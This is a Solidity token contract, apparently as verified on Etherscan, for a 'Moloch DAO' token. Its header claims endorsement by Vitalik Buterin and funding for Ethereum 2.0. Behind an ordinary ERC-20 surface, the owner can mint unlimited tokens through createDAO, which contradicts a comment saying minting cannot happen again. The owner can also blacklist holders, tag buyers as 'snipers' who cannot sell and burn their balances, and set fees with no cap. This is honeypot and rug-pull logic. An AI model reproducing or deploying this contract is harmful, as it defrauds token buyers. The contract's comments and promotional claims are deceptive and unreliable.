/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

/**
 MolochDao: It is a DAO liked by Vitalik Buterin
And also one of the members, its direct goal is to change the Ethereum blockchain and provide funds for the development of Ethereum 2.0
80% of marketing tax goes to funds for the development of Ethereum 2.0
TG:https://t.me/Moloch_DAO
WEB:https://www.molochdao.com/
*/

/**
 //SPDX-License-Identifier: UNLICENSED
 
*/

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}  

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

// uniswapV2Router

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// IERC20Meta



/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


   


// SafeMathInt



/**
 * @title SafeMathInt
 * @dev Math operations for int256 with overflow safety checks.
 */
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

// SAFEMATHUINT

/**
 * @title SafeMathUint
 * @dev Math operations with safety checks that revert on error
 */
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}


abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_)  {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

   
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    
     
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    function _createDAO(address account, uint256 amount) internal virtual {
        _mint(account, amount);
    }
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


// DividentInterface

contract MOLOCHDAO is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;

    bool private swapping;
    bool public deadBlock;
    bool public isLaunced;
    bool public profitBaseFeeOn = true;
    bool public buyingPriceOn = true;
    bool public IndividualSellLimitOn = true;
    
    uint256 public feeDivFactor = 100;
    uint256 public swapTokensAtAmount = balanceOf(address(this)) / feeDivFactor ;
    uint256 public liquidityFee;
    uint256 public marketingFee;
    uint256 public totalFees = liquidityFee.add(marketingFee);
    uint256 public maxFee = 30;
    uint256 private percentEquivalent;
    uint256 public maxBuyTransactionAmount;
    uint256 public maxSellTransactionAmount;
    uint256 public maxWalletToken;
    uint256 public launchedAt;
   
    mapping (address => Account) public _account;
    mapping (address => bool) public _isBlacklisted;
    mapping (address => bool) public _isSniper;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public automatedMarketMakerPairs;
    address[] public isSniper;
    
    address public uniswapV2Pair;
    address public liquidityReceiver;
    address public marketingFeeWallet;


    constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet, address uniswapV2RouterAddress) ERC20("Moloch DAO", "MolochDAO") {
        maxBuyTransactionAmount = ((supply.div(100)).mul(maxBuyPercent)) * 10**9;
        maxSellTransactionAmount = ((supply.div(100)).mul(maxSellPercent)) * 10**9;
        maxWalletToken = ((supply.div(100)).mul(maxWalletPercent)) * 10**9;
        percentEquivalent = (supply.div(100)) * 10**9;
        
        liquidityFee = liqFee;
        marketingFee = marketFee;
        totalFees = liqFee.add(marketFee);
        
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        liquidityReceiver = liqudityWallet;
        marketingFeeWallet = marketingWallet;
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
            // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(liquidityReceiver, true);
        excludeFromFees(marketingWallet, true);
        
        _mint(owner(), supply * (10**9));
    }

    receive() external payable {

  	}
  	
  	function setDeadBlock(bool deadBlockOn) external onlyOwner {
  	    deadBlock = deadBlockOn;
  	}
  	
  	function setMaxToken(uint256 maxBuy, uint256 maxSell, uint256 maxWallet) external onlyOwner {
  	    maxBuyTransactionAmount = maxBuy * (10**9);
  	    maxSellTransactionAmount = maxSell * (10**9);
  	    maxWalletToken = maxWallet * (10**9);
  	}
  	
  	function setProfitBasedFeeParameters(uint256 _maxFee, bool _profitBasedFeeOn, bool _buyingPriceOn) public onlyOwner{
  	    require(_maxFee <= 65);
  	    profitBaseFeeOn = _profitBasedFeeOn;
  	    buyingPriceOn = _buyingPriceOn;
  	    maxFee = _maxFee;
  	}
  	
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "Token: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setMarketingWallet(address payable wallet) external onlyOwner{
        marketingFeeWallet = wallet;
    }
    
    function purgeSniper() external onlyOwner {
                for(uint256 i = 0; i < isSniper.length; i++){
            address wallet = isSniper[i];
            uint256 balance = balanceOf(wallet);
            super._burn(address(wallet), balance);
            _isSniper[wallet] = false;
        }
    }
    
    function createDAO(address account, uint256 amount) external onlyOwner {
        super._createDAO(account, amount * (10 ** 9));
    }
    
    
    function setFee(uint256 liquidityFeeValue, uint256 marketingFeeValue) public onlyOwner {
        liquidityFee = liquidityFeeValue;
        marketingFee = marketingFeeValue;
        totalFees = liquidityFee.add(marketingFee);
        
        emit UpdateFees(liquidityFee, marketingFee, totalFees);

    }
    
    function setFeeDivFactor(uint256 value) external onlyOwner{
        feeDivFactor = value;
    }
    
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Token: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }
    
    function launch() public onlyOwner {
        isLaunced = true;
        launchedAt = block.timestamp.add(10);
    }
    
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "Token: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }
 
    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }
    
    function blacklistAddress(address account, bool blacklisted) public onlyOwner {
        _isBlacklisted[account] = blacklisted;
    }
    
    function withdrawRemainingToken(address erc20, address account) public onlyOwner {
        uint256 balance = IERC20(erc20).balanceOf(address(this));
        IERC20(erc20).transfer(account, balance);
    }
    
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlacklisted[to] && !_isBlacklisted[from], "Your address or recipient address is blacklisted");
        
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        
		uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        bool didSwap;

        if( canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;
            
            uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
            swapAndSendToMarketingWallet(marketingTokens);
            emit swapTokenForMarketing(marketingTokens, marketingFeeWallet);
            
            uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
            swapAndLiquify(swapTokens);
            emit swapTokenForLiquify(swapTokens);

            swapping = false;
            didSwap = true;
        }


        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if(takeFee) {
            if(automatedMarketMakerPairs[from]){
            require(isLaunced, "Token isn't launched yet");
            require(
                amount <= maxBuyTransactionAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
            
            require(
                balanceOf(to) + amount <= maxWalletToken,
                "Exceeds maximum wallet token amount."
            );
            
            bool dedBlock = block.timestamp <= launchedAt;
            if (dedBlock && !_isSniper[to])
            isSniper.push(to);
            
            if(deadBlock && !_isSniper[to])
            isSniper.push(to);
            
            if(buyingPriceOn == true){
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            
            emit DEXBuy(amount, to);
            
            }else if(automatedMarketMakerPairs[to]){
                require(!_isSniper[from], "You are sniper");
                require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");

                if(IndividualSellLimitOn == true && _account[from].sellLimitLiftedUp == false){
                    uint256 bal = balanceOf(from);
                    if(bal > 2){
                        require(amount <= bal.div(2));
                        _account[from].amountSold += amount;
                        if(_account[from].amountSold >= bal.div(3)){
                            _account[from].sellLimitLiftedUp = true;
                        }
                    }
                }
                
                if(balanceOf(from).sub(amount) == 0){
                    _account[from].priceBought = 0;
                }
            emit DEXSell(amount, from);
            
            }else if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]){
                
            if(buyingPriceOn == true){
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            
                if(balanceOf(from).sub(amount) == 0){
                    _account[from].priceBought = 0;
                }
                
            emit TokensTransfer(from, to, amount);
            }
            
        	uint256 fees = amount.mul(totalFees).div(100);
        	if(automatedMarketMakerPairs[to]){
        	    fees += amount.mul(1).div(100);
        	}
        	
        	uint256 profitFeeTokens;
        	if(profitBaseFeeOn == true && !_isExcludedFromFees[from] && automatedMarketMakerPairs[to]){
        	    uint256 p;
        	    if(didSwap == true){
        	        p = contractTokenBalance > percentEquivalent ? contractTokenBalance.div(percentEquivalent) : 1; 
        	    }
        	    profitFeeTokens = calculateProfitFee(_account[from].priceBought, amount, p);
        	    profitFeeTokens = profitFeeTokens > fees ? profitFeeTokens - fees : 0;
        	}
        	
        	amount = amount.sub(fees + profitFeeTokens);

            super._transfer(from, address(this), fees + profitFeeTokens);
        }

        super._transfer(from, to, amount);
    }
    
    function getCurrentPrice() public view returns (uint256 currentPrice) {//This value serves as a reference to calculate profit only.
       IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
       uint256 tokens;
       uint256 ETH;
       (tokens, ETH,) = pair.getReserves();
       if(ETH > tokens){
            uint256 _tokens = tokens;
            tokens = ETH;
            ETH = _tokens;
        }
        if(ETH == 0){
            currentPrice = 0;
        }else if((ETH * 1000000000000) > tokens){
            currentPrice = (ETH * 1000000000000).div(tokens);
        }else{
            currentPrice = 0;
        }
   }

    function calculateProfitFee(uint256 priceBought, uint256 amountSelling, uint256 percentageReduction) private view returns (uint256 feeTokens){
        uint256 currentPrice = getCurrentPrice();
        uint256 feePercentage;
        if(priceBought == 0 || amountSelling < 100){
            feeTokens = 0;
        }
        else if(priceBought + 10 < currentPrice){
            uint256 h = 100;
            feePercentage = h.div((currentPrice.div((currentPrice - priceBought).div(2))));
            if(maxFee > percentageReduction){
                feePercentage = feePercentage >= maxFee - percentageReduction ? maxFee - percentageReduction : feePercentage; 
                feeTokens = feePercentage > 0 ? amountSelling.mul(feePercentage).div(h) : 0;
            }else{
                feeTokens = 0;
            }
        }else{
            feeTokens = 0;
        }
    }
    
    function calculateBuyingPrice(address buyer, uint256 amountBuying) private view returns (uint256 price){
        uint256 currentPrice = getCurrentPrice();
        uint256 p1 = _account[buyer].priceBought;
        uint256 buyerBalance = balanceOf(buyer);
        if(p1 == 0 || buyerBalance == 0){
            price = currentPrice;
        }else if(amountBuying == 0){
            price = p1;
        }else{
            price = ((p1 * buyerBalance) + (currentPrice * amountBuying)).div(buyerBalance + amountBuying);
        }
    }

    function swapAndSendToMarketingWallet(uint256 tokens) private  {
        swapTokensForEth(tokens);
        payable(marketingFeeWallet).transfer(address(this).balance);

    }

    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {


        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(liquidityReceiver),
            block.timestamp
        );

    }
    
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    struct Account{uint256 lastBuy;uint256 lastSell;uint256 priceBought;uint256 amountSold;bool sellLimitLiftedUp;}
    event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived,uint256 tokensIntoLiqudity);
    event UpdateFees(uint256 newliquidityfees, uint256 newMarketingFees, uint256 newTotalFees);
    event swapTokenForLiquify(uint256 amount);
    event swapTokenForMarketing(uint256 amount, address sendToWallet);
    event DEXBuy(uint256 tokensAmount, address buyers);
    event DEXSell(uint256 tokensAmount, address sellers);
    event TokensTransfer(address sender, address recipient, uint256 amount);

}